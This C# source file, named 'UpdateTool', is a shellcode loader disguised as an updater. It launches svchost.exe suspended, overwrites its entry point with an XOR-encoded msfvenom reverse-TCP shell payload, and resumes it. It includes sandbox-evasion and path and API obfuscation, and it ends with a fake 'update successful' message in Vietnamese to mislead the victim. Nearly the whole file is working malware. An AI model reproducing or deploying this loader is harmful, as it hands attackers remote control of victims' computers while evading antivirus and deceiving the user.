using UpdateTool.Mod.he;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace UpdateTool
{
    internal class Program
    {

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        private struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string aaaa, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        // Custom delegate functions for the DLL imports
        private delegate bool M1(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string aaa, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        private delegate int M2(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        private delegate bool M3(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        private delegate bool M4(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        private delegate uint M5(IntPtr hThread);

        // Create delegate instances
        private static M1 F1;
        private static M2 F2;
        private static M3 F3;
        private static M4 F4;
        private static M5 F5;

        static void Main(string[] args)
        {
            // Initialize delegate instances with the original DLL functions
            F1 = CreateProcess;
            F2 = ZwQueryInformationProcess;
            F3 = ReadProcessMemory;
            F4 = WriteProcessMemory;
            F5 = ResumeThread;

            // Run sandbox/emulation evasion first before executing our shellcode

            // Perform many iterations of for loop, 900 million, to trip up emulator
            Evasion.MI();

            // After evasion is performed, we finally call the runner
            Run();
        }

        static void Run()
        {

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // Obfuscated parts of the path
            string part1 = "C:\\Wi";
            string part2 = "ndo";
            string part3 = "ws\\Sy";
            string part4 = "stem";
            string part5 = "32\\sv";
            string part6 = "chost.exe";

            // Concatenate and reconstruct the path at runtime
            string path = $"{part1}{part2}{part3}{part4}{part5}{part6}";

            bool res = F1(null, path, IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            F2(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            F3(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            F3(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            // Generate non Meterpreter XOR shellcode with MSFVenom: msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.x.x LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key z -i 20 | tr -d '\n\r'
            byte[] buf = new byte[449] { 0x8a, 0x3e, 0xf5, 0x92, 0x86, 0x9e, 0xba, 0x76, 0x76, 0x76, 0x37, 0x27, 0x37, 0x26, 0x24, 0x27, 0x20, 0x3e, 0x47, 0xa4, 0x13, 0x3e, 0xfd, 0x24, 0x16, 0x3e, 0xfd, 0x24, 0x6e, 0x3e, 0xfd, 0x24, 0x56, 0x3e, 0x79, 0xc1, 0x3c, 0x3c, 0x3b, 0x47, 0xbf, 0x3e, 0xfd, 0x04, 0x26, 0x3e, 0x47, 0xb6, 0xda, 0x4a, 0x17, 0x0a, 0x74, 0x5a, 0x56, 0x37, 0xb7, 0xbf, 0x7b, 0x37, 0x77, 0xb7, 0x94, 0x9b, 0x24, 0x3e, 0xfd, 0x24, 0x56, 0x37, 0x27, 0xfd, 0x34, 0x4a, 0x3e, 0x77, 0xa6, 0x10, 0xf7, 0x0e, 0x6e, 0x7d, 0x74, 0x79, 0xf3, 0x04, 0x76, 0x76, 0x76, 0xfd, 0xf6, 0xfe, 0x76, 0x76, 0x76, 0x3e, 0xf3, 0xb6, 0x02, 0x11, 0x3e, 0x77, 0xa6, 0x26, 0xfd, 0x3e, 0x6e, 0x32, 0xfd, 0x36, 0x56, 0x3f, 0x77, 0xa6, 0x95, 0x20, 0x3e, 0x89, 0xbf, 0x37, 0xfd, 0x42, 0xfe, 0x3e, 0x77, 0xa0, 0x3b, 0x47, 0xbf, 0x3e, 0x47, 0xb6, 0xda, 0x37, 0xb7, 0xbf, 0x7b, 0x37, 0x77, 0xb7, 0x4e, 0x96, 0x03, 0x87, 0x3a, 0x75, 0x3a, 0x52, 0x7e, 0x33, 0x4f, 0xa7, 0x03, 0xae, 0x2e, 0x32, 0xfd, 0x36, 0x52, 0x3f, 0x77, 0xa6, 0x10, 0x37, 0xfd, 0x7a, 0x3e, 0x32, 0xfd, 0x36, 0x6a, 0x3f, 0x77, 0xa6, 0x37, 0xfd, 0x72, 0xfe, 0x37, 0x2e, 0x3e, 0x77, 0xa6, 0x37, 0x2e, 0x28, 0x2f, 0x2c, 0x37, 0x2e, 0x37, 0x2f, 0x37, 0x2c, 0x3e, 0xf5, 0x9a, 0x56, 0x37, 0x24, 0x89, 0x96, 0x2e, 0x37, 0x2f, 0x2c, 0x3e, 0xfd, 0x64, 0x9f, 0x3d, 0x89, 0x89, 0x89, 0x2b, 0x3f, 0xc8, 0x01, 0x05, 0x44, 0x29, 0x45, 0x44, 0x76, 0x76, 0x37, 0x20, 0x3f, 0xff, 0x90, 0x3e, 0xf7, 0x9a, 0xd6, 0x77, 0x76, 0x76, 0x3f, 0xff, 0x93, 0x3f, 0xca, 0x74, 0x76, 0x77, 0xcd, 0xb6, 0xde, 0x7d, 0xe0, 0x37, 0x22, 0x3f, 0xff, 0x92, 0x3a, 0xff, 0x87, 0x37, 0xcc, 0x3a, 0x01, 0x50, 0x71, 0x89, 0xa3, 0x3a, 0xff, 0x9c, 0x1e, 0x77, 0x77, 0x76, 0x76, 0x2f, 0x37, 0xcc, 0x5f, 0xf6, 0x1d, 0x76, 0x89, 0xa3, 0x1c, 0x7c, 0x37, 0x28, 0x26, 0x26, 0x3b, 0x47, 0xbf, 0x3b, 0x47, 0xb6, 0x3e, 0x89, 0xb6, 0x3e, 0xff, 0xb4, 0x3e, 0x89, 0xb6, 0x3e, 0xff, 0xb7, 0x37, 0xcc, 0x9c, 0x79, 0xa9, 0x96, 0x89, 0xa3, 0x3e, 0xff, 0xb1, 0x1c, 0x66, 0x37, 0x2e, 0x3a, 0xff, 0x94, 0x3e, 0xff, 0x8f, 0x37, 0xcc, 0xef, 0xd3, 0x02, 0x17, 0x89, 0xa3, 0xf3, 0xb6, 0x02, 0x7a, 0x3f, 0x89, 0xb8, 0x03, 0x93, 0x1e, 0x86, 0xc3, 0xd4, 0x20, 0x89, 0xa3, 0x3e, 0xf5, 0x9a, 0x66, 0x3e, 0xff, 0x94, 0x3b, 0x47, 0xbf, 0x1c, 0x72, 0x37, 0x2e, 0x3e, 0xff, 0x8f, 0x37, 0xcc, 0x74, 0xaf, 0xbe, 0x29, 0x89, 0xa3, 0x3e, 0xf5, 0xb2, 0x56, 0x28, 0xff, 0x80, 0x1c, 0x36, 0x37, 0x2f, 0x1e, 0x76, 0x66, 0x76, 0x76, 0x37, 0x2e, 0x3e, 0xff, 0x84, 0x3e, 0x47, 0xbf, 0x37, 0xcc, 0x2e, 0xd2, 0x25, 0x93, 0x89, 0xa3, 0x3e, 0xff, 0xb5, 0x3f, 0xff, 0xb1, 0x3b, 0x47, 0xbf, 0x3f, 0xff, 0x86, 0x3e, 0xff, 0xac, 0x3e, 0xff, 0x8f, 0x37, 0xcc, 0x74, 0xaf, 0xbe, 0x29, 0x89, 0xa3, 0x3e, 0x77, 0xb5, 0x3e, 0x5f, 0xb0, 0x3e, 0xf3, 0x80, 0x03, 0x97, 0x37, 0x89, 0x91 };

            // XOR decrypt, key is set to 'v'
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'v');
            }

            F4(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            F5(pi.hThread);
            MessageBox.Show("đã tự động cập nhật thành công");
        }
    }
}